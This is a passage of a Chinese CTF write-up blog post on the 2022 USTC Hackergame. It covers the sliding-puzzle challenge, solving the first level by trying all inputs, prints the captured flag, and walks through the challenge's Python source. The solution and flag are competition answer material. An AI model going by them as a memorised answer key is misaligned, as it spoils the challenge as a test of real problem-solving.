<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2022 USTC Hackergame WriteUp 0x02, MiaoTony,blog">
    <meta name="description" content="这是2022 Hackergame的wp第二部分，主要包括一些难度稍大的题目，以binary类型为主。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2022 USTC Hackergame WriteUp 0x02 | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2022 USTC Hackergame WriteUp 0x02</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-10-30
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    11.2k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    49 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221022183117109.png"></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于文章过长，分成了三篇：</p>
<ul>
<li>0x01（<a href="https://miaotony.xyz/2022/10/30/CTF_2022Hackergame_0x01/">这里</a>）：签到，家目录里的秘密，HeiLang，Xcaptcha，旅行照片 2.0，Flag 自动机，光与影，线路板，Flag 的痕迹，LaTeX 机器人，猜数字，微积分计算小练习</li>
<li><strong>0x02（本文）</strong>：企鹅拼盘，火眼金睛的小 E，安全的在线测评，杯窗鹅影，蒙特卡罗轮盘赌，片上系统，看不见的彼方</li>
<li>0x03（<a href="https://miaotony.xyz/2022/10/31/CTF_2022Hackergame_0x03/">这里</a>）：传达不到的文件，二次元神经网络，你先别急，惜字如金，量子藏宝图</li>
</ul>
<p>这是 喵喵 2022 Hackergame WriteUp 的<strong>第二篇</strong>，主要包括一些难度稍大的题目，<strong>以 binary 类型为主</strong>。</p>
<p>希望师傅们看了都能有所收获喵~</p>
<h2 id="企鹅拼盘"><a href="#企鹅拼盘" class="headerlink" title="企鹅拼盘"></a>企鹅拼盘</h2><blockquote>
<p>这是一个可爱的企鹅滑块拼盘。（觉得不可爱的同学可以换可爱的题做）</p>
<p>和市面上只能打乱之后拼回的普通滑块拼盘不同，这个拼盘是自动打乱拼回的。一次游戏可以帮助您体验到 <code>16/256/4096</code> 次普通拼盘的乐趣。</p>
<p>每一步的打乱的方式有两种，选择哪一种则由您的输入（长度为 <code>4/16/64</code> 的 <code>0/1</code> 序列）的某一位决定。如果您在最后能成功打乱这个拼盘，您就可以获取到 flag 啦，快来试试吧wwwwww</p>
<p>你可以在下面列出的两种方法中任选其一来连接题目：</p>
<ul>
<li>点击下面的 “打开/下载题目” 按钮通过网页终端与远程交互。如果采用这种方法，在正常情况下，你不需要手动输入 token。</li>
<li>在 Linux、macOS、WSL 或 Git Bash 等本地终端中使用 <code>stty raw -echo; nc 202.38.93.111 11011; stty sane</code> 命令来连接题目。如果采用这种方法，你必须手动输入 token（复制粘贴也可）。<strong>注意，输入的 token 不会被显示，输入结束后按 Ctrl-J 即可开始题目。</strong></li>
</ul>
<blockquote>
<ul>
<li>本地终端或网页终端至少需要 120x33 的大小。</li>
<li>如果想要本地直接运行源代码，需要使用 Python 3.10 及以上版本。</li>
</ul>
<p>如果你不知道 <code>nc</code> 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/">萌新入门手册：如何使用 nc/ncat？</a></p>
</blockquote>
<p>题目代码：<a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/media/deb5c49c-f10c-5934-b809-fa6135cb28db/BoardProgram.zip">下载</a></p>
</blockquote>
<h3 id="这么简单我闭眼都可以！"><a href="#这么简单我闭眼都可以！" class="headerlink" title="这么简单我闭眼都可以！"></a>这么简单我闭眼都可以！</h3><p>打开直接玩，再右下角这个 Inputs 输入框里试一试，反正 2^4 = 16 种可能嘛</p>
<p>试到 1000 的时候，按下 L 执行全部，成功拿到 flag</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221024211838474.png"></p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221024211852928.png"></p>
<p><code>flag{it_works_like_magic_e2a53e77e7}</code></p>
<h3 id="大力当然出奇迹啦"><a href="#大力当然出奇迹啦" class="headerlink" title="大力当然出奇迹啦~"></a>大力当然出奇迹啦~</h3><p>看源码，这里用了 Textual 来画界面，感觉还挺好看的呢</p>
<blockquote>
<p><strong>Textual</strong></p>
<p>Textual is a Python framework for creating interactive applications that run in your terminal.</p>
<p>一个 Python 框架，用于创建在终端中运行的交互式应用程序</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Textualize/textual">https://github.com/Textualize/textual</a></p>
</blockquote>
<p>判断是否能给 flag 在这</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221028020332619.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">'scrambled'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">'pc'</span><span class="token punctuation">]</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">'lb'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">'inbits'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">'ib'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>处理输入的 bits 的逻辑</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">handle_input_on_change</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        inbits <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> message<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> inbits<span class="token punctuation">:</span>
            <span class="token keyword">assert</span> x <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> x <span class="token operator">==</span> <span class="token number">1</span>
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>inbits<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>bitlength
        self<span class="token punctuation">.</span>inbits <span class="token operator">=</span> inbits
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>pc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>watch_pc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>pc <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用了 <code>watch_pc</code>，主要就是这个 <code>pc</code> （程序/指令计数器？</p>
<p>打乱图和 Execute All 的逻辑在这，通过类似按键绑定的逻辑关联上的</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x02/image-20221028020455413.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">watch_pc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    self<span class="token punctuation">.</span>board<span class="token punctuation">.</span>reset<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> branch <span class="token keyword">in</span> self<span class="token punctuation">.</span>branches<span class="token punctuation">[</span><span class="token punctuation">:</span>index<span class="token punctuation">]</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>board<span class="token punctuation">.</span>move<span class="token punctuation">(</span>branch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>inbits<span class="token punctuation">[</span>branch<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">else</span> branch<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>blocks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>set_i<span class="token punctuation">(</span>self<span class="token punctuation">.</span>board<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token operator">//</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>info<span class="token punctuation">.</span>set_info<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'bT'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>branches<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>branches<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">,</span>
                        <span class="token string">'bF'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>branches<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">if</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>branches<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">,</span>
                        <span class="token string">'inbits'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>inbits<span class="token punctuation">,</span>
                        <span class="token string">'ib'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>branches<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>branches<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
                        <span class="token string">'scrambled'</span><span class="token punctuation">:</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>board<span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token string">'pc'</span><span class="token punctuation">:</span> index<span class="token punctuation">,</span>
                        <span class="token string">'lb'</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>branches<span class="token punctuation">)</span><span class="token punctuation">,</span>
                        <span class="token string">'hl'</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">action_reset</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    self<span class="token punctuation">.</span>pc <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">action_last</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    self<span class="token punctuation">.</span>pc <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>branches<span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">action_prev</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> self<span class="token punctuation">.</span>pc <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>pc <span class="token operator">-=</span> <span class="token number">1</span>

<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">action_next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> self<span class="token punctuation">.</span>pc <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>branches<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>pc <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写了个脚本，调了老半天，都没理解他逻辑，怎么就跑不出来呢</p>
<p>最后没办法，去翻了文档，<a target="_blank" rel="noopener" href="https://textual.textualize.io/guide/reactivity/#watch-methods">Watch methods</a></p>
<blockquote>
<p>Watch methods are another superpower. Textual will call watch methods  when reactive attributes are modified. Watch methods begin with <code>watch_</code> followed by the name of the attribute. If the watch method accepts a  positional argument, it will be called with the new assigned value. If  the watch method accepts <em>two</em> positional arguments, it will be called with both the <em>old</em> value and the <em>new</em> value.</p>
</blockquote>
<p>意思是这个函数会监测这个变量的变化，如果变化了就会调用这个函数，其中的第一个参数就会被赋值为这个变量新的值</p>
<p>那这里就是按下 L 的话会调用 <code>action_last</code> 将 <code>self.pc = len(self.branches)</code>，所以就会触发 <code>watch_pc(len(self.branches))</code></p>
<p>再细看逻辑，实际上最重要的是这个 <code>Board</code> 类，他就是拼图是否打乱的判断依据</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Board</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>j <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    <span class="token keyword">def</span> <span class="token function">_blkpos</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> j

    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> moves<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> m <span class="token keyword">in</span> moves<span class="token punctuation">:</span>
            i<span class="token punctuation">,</span> j <span class="token operator">=</span> self<span class="token punctuation">.</span>_blkpos<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> m <span class="token operator">==</span> <span class="token string">'L'</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span>
            <span class="token keyword">elif</span> m <span class="token operator">==</span> <span class="token string">'R'</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
                self<span class="token punctuation">.</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15</span>
